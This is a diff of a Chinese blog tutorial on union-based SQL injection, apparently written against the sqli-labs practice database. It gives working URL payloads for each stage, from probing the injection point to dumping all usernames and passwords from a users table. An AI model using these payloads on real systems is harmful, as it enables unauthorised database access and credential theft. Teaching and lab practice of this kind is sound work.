@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"qyzy.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="联合查询(union注入)联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化 1.  页面观察当我们输入id&#x3D;1和id&#x3D;2时，页面中name值和password的值是不一样的，说明此时我们输入的数据和数据库有交互并且将数据显示在屏幕上了   2. 注入点判断开始判断是否存在注入，输入?id&#x3D;1’，页面发生报错，说明后端对我前端的数据输入没有很">
+  <meta name="description" content="联合查询(union注入) 联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化 ## 1. 页面观察 当我们输入id&#x3D;1和id&#x3D;2时，页面中name值和password的值是不一样的，说明此时我们输入的数据和数据库有交互并且将数据显示在屏幕上了 2. 注入点判断 开始判断是否存在注入，输入?id&#x3D;1&#39;，页面发生报错，说明后端对我前端的数据输入没有很好的过滤，产生">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入之联合查询">
 <meta property="og:url" content="https://qyzy.github.io/2022/11/05/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/index.html">
 <meta property="og:site_name" content="Welcome To QYZY&#39;s Blog">
-<meta property="og:description" content="联合查询(union注入)联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化 1.  页面观察当我们输入id&#x3D;1和id&#x3D;2时，页面中name值和password的值是不一样的，说明此时我们输入的数据和数据库有交互并且将数据显示在屏幕上了   2. 注入点判断开始判断是否存在注入，输入?id&#x3D;1’，页面发生报错，说明后端对我前端的数据输入没有很">
+<meta property="og:description" content="联合查询(union注入) 联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化 ## 1. 页面观察 当我们输入id&#x3D;1和id&#x3D;2时，页面中name值和password的值是不一样的，说明此时我们输入的数据和数据库有交互并且将数据显示在屏幕上了 2. 注入点判断 开始判断是否存在注入，输入?id&#x3D;1&#39;，页面发生报错，说明后端对我前端的数据输入没有很好的过滤，产生">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-11-05T06:35:42.000Z">
 <meta property="article:modified_time" content="2023-04-23T09:33:11.840Z">
@@ -214,19 +214,37 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="联合查询-union注入"><a href="#联合查询-union注入" class="headerlink" title="联合查询(union注入)"></a>联合查询(union注入)</h1><p>联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化</p>
-<h2 id="1-页面观察"><a href="#1-页面观察" class="headerlink" title="1.  页面观察"></a>1.  页面观察</h2><p>当我们输入id&#x3D;1和id&#x3D;2时，页面中name值和password的值是不一样的，说明此时我们输入的数据和数据库有交互并且将数据显示在屏幕上了  </p>
-<h2 id="2-注入点判断"><a href="#2-注入点判断" class="headerlink" title="2. 注入点判断"></a>2. 注入点判断</h2><p>开始判断是否存在注入，输入?id&#x3D;1’，页面发生报错，说明后端对我前端的数据输入没有很好的过滤，产生了sql注入漏洞  </p>
-<p>继续判断 </p>
-<p><code>?id=1&#39; and 1=1 --+ </code>  页面正常显示</p>
-<p><code>?id=1&#39; and 1=2 --+ </code> 页面不正常显示，说明程序对我们的输入做出了正确的判断，所以注入点就是单引号</p>
-<h2 id="3-判断当前表的字段个数"><a href="#3-判断当前表的字段个数" class="headerlink" title="3. 判断当前表的字段个数"></a>3. 判断当前表的字段个数</h2><p><code>?id=1 order by 3 --+ </code><br><code>?id=1 order by 4 --+</code> ,此时显示未知的列，说明此时当前表中只有3列</p>
-<h2 id="4-判断显示位"><a href="#4-判断显示位" class="headerlink" title="4. 判断显示位"></a>4. 判断显示位</h2><p>上面我们判断出来了表中有3列，接下来判断我们的输入会在屏幕哪个地方进行回显<br><code>?id=-1&#39; union select 1,2,3 --+ </code><br>让union select前面的参数查不出来，所以id&#x3D;-1’</p>
+        <h1 id="联合查询union注入">联合查询(union注入)</h1>
+<p>联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化
+## 1. 页面观察</p>
+<p>当我们输入id=1和id=2时，页面中name值和password的值是不一样的，说明此时我们输入的数据和数据库有交互并且将数据显示在屏幕上了</p>
+<h2 id="注入点判断">2. 注入点判断</h2>
+<p>开始判断是否存在注入，输入?id=1'，页面发生报错，说明后端对我前端的数据输入没有很好的过滤，产生了sql注入漏洞</p>
+<p>继续判断</p>
+<p><code>?id=1' and 1=1 --+</code> 页面正常显示</p>
+<p><code>?id=1' and 1=2 --+</code>
+页面不正常显示，说明程序对我们的输入做出了正确的判断，所以注入点就是单引号</p>
+<h2 id="判断当前表的字段个数">3. 判断当前表的字段个数</h2>
+<p><code>?id=1 order by 3 --+</code><br />
+<code>?id=1 order by 4 --+</code>
+,此时显示未知的列，说明此时当前表中只有3列</p>
+<h2 id="判断显示位">4. 判断显示位</h2>
+<p>上面我们判断出来了表中有3列，接下来判断我们的输入会在屏幕哪个地方进行回显<br />
+<code>?id=-1' union select 1,2,3 --+</code><br />
+让union select前面的参数查不出来，所以id=-1'</p>
 <p>如下，在name和password中回显了我们的输入，这时我们就随便选一个地方来放置接下来的测试语句。</p>
-<h2 id="5-爆数据库名字"><a href="#5-爆数据库名字" class="headerlink" title="5. 爆数据库名字"></a>5. 爆数据库名字</h2><p><code>?id=-1&#39; union select 1,database(),3 --+</code></p>
-<h2 id="6-爆数据库中的表"><a href="#6-爆数据库中的表" class="headerlink" title="6. 爆数据库中的表"></a>6. 爆数据库中的表</h2><p><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code><br>其中爆出来数据库中存在三个表</p>
-<h2 id="7-爆表中的字段"><a href="#7-爆表中的字段" class="headerlink" title="7. 爆表中的字段"></a>7. 爆表中的字段</h2><p>我们这里选择一个表，users进行进一步的获取表中的字段值<br><code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; --+</code><br>获取到三个字段，分别为id,username,password</p>
-<h2 id="8-爆相应字段的所有数据"><a href="#8-爆相应字段的所有数据" class="headerlink" title="8. 爆相应字段的所有数据"></a>8. 爆相应字段的所有数据</h2><p><code>?id=-1&#39; union select 1,group_concat(id,&#39;--&#39;,username,&#39;--&#39;,password),3 from users --+</code><br>至此，一次完整的脱库过程结束了，联合查询也就结束了。</p>
+<h2 id="爆数据库名字">5. 爆数据库名字</h2>
+<p><code>?id=-1' union select 1,database(),3 --+</code></p>
+<h2 id="爆数据库中的表">6. 爆数据库中的表</h2>
+<p><code>?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code>
+其中爆出来数据库中存在三个表</p>
+<h2 id="爆表中的字段">7. 爆表中的字段</h2>
+<p>我们这里选择一个表，users进行进一步的获取表中的字段值<br />
+<code>?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+</code><br />
+获取到三个字段，分别为id,username,password</p>
+<h2 id="爆相应字段的所有数据">8. 爆相应字段的所有数据</h2>
+<p><code>?id=-1' union select 1,group_concat(id,'--',username,'--',password),3 from users --+</code><br />
+至此，一次完整的脱库过程结束了，联合查询也就结束了。</p>
 
     </div>
 
@@ -310,7 +328,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2-union%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">联合查询(union注入)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E9%A1%B5%E9%9D%A2%E8%A7%82%E5%AF%9F"><span class="nav-number">1.1.</span> <span class="nav-text">1.  页面观察</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A4%E6%96%AD"><span class="nav-number">1.2.</span> <span class="nav-text">2. 注入点判断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%88%A4%E6%96%AD%E5%BD%93%E5%89%8D%E8%A1%A8%E7%9A%84%E5%AD%97%E6%AE%B5%E4%B8%AA%E6%95%B0"><span class="nav-number">1.3.</span> <span class="nav-text">3. 判断当前表的字段个数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E5%88%A4%E6%96%AD%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="nav-number">1.4.</span> <span class="nav-text">4. 判断显示位</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E5%AD%97"><span class="nav-number">1.5.</span> <span class="nav-text">5. 爆数据库名字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8"><span class="nav-number">1.6.</span> <span class="nav-text">6. 爆数据库中的表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-%E7%88%86%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5"><span class="nav-number">1.7.</span> <span class="nav-text">7. 爆表中的字段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-%E7%88%86%E7%9B%B8%E5%BA%94%E5%AD%97%E6%AE%B5%E7%9A%84%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE"><span class="nav-number">1.8.</span> <span class="nav-text">8. 爆相应字段的所有数据</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2union%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">联合查询(union注入)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A4%E6%96%AD"><span class="nav-number">1.1.</span> <span class="nav-text">2. 注入点判断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%BD%93%E5%89%8D%E8%A1%A8%E7%9A%84%E5%AD%97%E6%AE%B5%E4%B8%AA%E6%95%B0"><span class="nav-number">1.2.</span> <span class="nav-text">3. 判断当前表的字段个数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="nav-number">1.3.</span> <span class="nav-text">4. 判断显示位</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E5%AD%97"><span class="nav-number">1.4.</span> <span class="nav-text">5. 爆数据库名字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8"><span class="nav-number">1.5.</span> <span class="nav-text">6. 爆数据库中的表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5"><span class="nav-number">1.6.</span> <span class="nav-text">7. 爆表中的字段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E7%9B%B8%E5%BA%94%E5%AD%97%E6%AE%B5%E7%9A%84%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE"><span class="nav-number">1.7.</span> <span class="nav-text">8. 爆相应字段的所有数据</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
